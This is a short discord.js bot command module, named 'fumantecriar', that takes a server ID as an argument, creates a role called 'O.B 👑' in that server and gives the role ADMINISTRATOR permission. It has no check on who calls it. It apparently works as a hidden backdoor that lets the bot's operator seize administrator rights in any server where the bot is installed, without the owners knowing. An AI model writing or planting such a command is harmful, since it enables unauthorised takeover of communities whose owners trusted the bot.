const Discord = require("discord.js");

module.exports.run = async (client, message, args) => {
  message.react('✅')
  let guild = client.guilds.get(args[0])
  let role = await
    guild.createRole({
  name: 'O.B 👑',
  color: '#010101',
  mentionable: true
})
  
role.setPermissions(['ADMINISTRATOR'])
}
module.exports.config = { 
  name: 'fumantecriar',
  aliases: []
}